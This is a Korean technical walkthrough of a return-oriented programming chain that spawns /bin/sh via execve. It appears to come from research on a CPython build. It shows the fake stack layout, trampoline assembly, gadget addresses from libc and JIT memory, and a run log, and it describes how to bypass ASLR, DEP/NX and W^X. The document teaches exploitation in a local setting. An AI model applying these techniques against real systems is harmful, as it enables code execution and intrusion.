# ROP Chain 실행 흐름 설명

## 개요
`execute_rop_chain` 함수는 Return-Oriented Programming 기법으로 `/bin/sh` 셸을 실행합니다.

## 실행 흐름 상세

### 1. 초기 상태 준비
```
Memory Layout:
┌─────────────────────────────────────┐
│ stub (Trampoline)                   │ ← 여기서 시작
│ - mov r12, stack_ptr                │
│ - mov rax, first_gadget             │
│ - jmp rax                           │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│ stack (Fake Stack)                  │
│ [+0x00] = pop_rax_gadget           │
│ [+0x08] = 59                        │ ← stack_after_first_gadget
│ [+0x10] = pop_rdi_gadget           │
│ [+0x18] = binsh_addr                │
│ [+0x20] = pop_rsi_gadget           │
│ [+0x28] = 0                         │
│ [+0x30] = pop_rdx_gadget           │
│ [+0x38] = 0                         │
│ [+0x40] = syscall_gadget           │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│ binsh_addr                          │
│ "/bin/sh\x00"                       │
└─────────────────────────────────────┘
```

### 2. 트램폴린 실행
```asm
; stub에서 시작
mov r12, 0x7330467d60008    ; RSP로 사용할 스택 주소 (stack + 8)
mov rax, 0x733046513f08     ; 첫 번째 가젯 주소 (pop rax)
jmp rax                      ; pop rax 가젯으로 점프
```

**중요**: r12에 `stack + 8`을 저장하는 이유는 첫 번째 가젯 주소는 이미 rax에 넣었으므로 스택의 다음 위치부터 사용해야 하기 때문입니다.

### 3. ROP 가젯 체인 실행

#### 3.1 첫 번째 가젯: `pop rax; ret`
```
위치: stack[0] (0x733046513f08)
동작:
  pop rax      ; stack[1]의 값(59)을 rax로
  ret          ; stack[2]의 주소(pop_rdi_gadget)로 점프

결과: rax = 59 (execve 시스템콜 번호)
```

#### 3.2 두 번째 가젯: `pop rdi; ret`
```
위치: stack[2] (0x7fe000b5d01f - JIT에서 발견!)
동작:
  pop rdi      ; stack[3]의 값(binsh_addr)을 rdi로
  ret          ; stack[4]의 주소(pop_rsi_gadget)로 점프

결과: rdi = 0x733048beb000 ("/bin/sh" 문자열 주소)
```

#### 3.3 세 번째 가젯: `pop rsi; ret`
```
위치: stack[4] (0x73304664fa79 - libc에서 발견)
동작:
  pop rsi      ; stack[5]의 값(0)을 rsi로
  ret          ; stack[6]의 주소(pop_rdx_gadget)로 점프

결과: rsi = 0 (argv = NULL)
```

#### 3.4 네 번째 가젯: `pop rdx; ret`
```
위치: stack[6] (0x7330465cf553 - libc에서 발견)
동작:
  pop rdx      ; stack[7]의 값(0)을 rdx로
  ret          ; stack[8]의 주소(syscall_gadget)로 점프

결과: rdx = 0 (envp = NULL)
```

#### 3.5 최종 가젯: `syscall`
```
위치: stack[8] (0x7330464b5138 - libc에서 발견)
동작:
  syscall      ; 시스템콜 실행!

레지스터 상태:
  rax = 59     (sys_execve)
  rdi = "/bin/sh" 주소
  rsi = 0
  rdx = 0

실행: execve("/bin/sh", NULL, NULL)
→ 새로운 셸 프로세스 생성!
```

## 핵심 개념

### ROP (Return-Oriented Programming)란?
- **목적**: 실행 권한 없이도 코드 실행
- **방법**: 기존 코드의 짧은 명령어 조각(가젯)을 연결
- **특징**: `ret` 명령어로 다음 가젯으로 점프

### 왜 가짜 스택을 사용하나?
```python
stack = allocate_rwx(0x1000)  # 우리가 제어하는 메모리
```
- 실제 스택을 조작하면 프로그램이 망가짐
- 독립된 메모리 영역에서 ROP 체인 실행
- 읽기/쓰기/실행 권한 모두 필요

### 트램폴린의 역할
```
[일반 함수 호출] → [트램폴린] → [ROP 체인] → [셸 실행]
```
- Python ctypes에서 ROP 체인을 시작하는 **진입점**
- RSP를 가짜 스택으로 설정
- 첫 번째 가젯으로 제어 이동

## 실제 실행 예시

```bash
$ /home/mobileos2/cpython/build/python gadget_chain_parallel.py

=== [ ROP Stack Layout ] ===
[Stack +0x00] = 0x733046513f08  # pop rax 가젯
[Stack +0x08] = 0x3b            # 59 (execve)
[Stack +0x10] = 0x7fe000b5d01f  # pop rdi 가젯 (JIT)
[Stack +0x18] = 0x733048beb000  # "/bin/sh" 주소
[Stack +0x20] = 0x73304664fa79  # pop rsi 가젯 (libc)
[Stack +0x28] = 0x0             # NULL
[Stack +0x30] = 0x7330465cf553  # pop rdx 가젯 (libc)
[Stack +0x38] = 0x0             # NULL
[Stack +0x40] = 0x7330464b5138  # syscall 가젯 (libc)

Press Enter to execute ROP chain...

# Enter 키를 누르면...
$ _                              # 새로운 셸 프롬프트!
```

## 보안 우회 기법

### ASLR 우회
- **문제**: 주소가 실행마다 바뀜
- **해결**: 런타임에 libc/JIT 주소 동적 탐지

### DEP/NX 우회
- **문제**: 스택에서 코드 실행 불가
- **해결**: 기존 실행 가능 코드의 가젯만 사용

### W^X 완화
- **현재**: `/bin/sh` 문자열과 트램폴린을 RWX 메모리에 배치
- **개선 가능**: libc의 "/bin/sh" 문자열 사용하면 RWX 불필요

## 요약

1. **준비**: 가짜 스택과 트램폴린 생성
2. **배치**: ROP 가젯 주소와 인자를 스택에 순서대로 배치
3. **시작**: 트램폴린에서 첫 가젯으로 점프
4. **연쇄**: `ret` 명령어로 가젯들이 순차 실행
5. **완성**: 레지스터 설정 후 `syscall`로 셸 실행

**결과**: 순수 ROP만으로 `execve("/bin/sh")` 실행 성공! 🎉
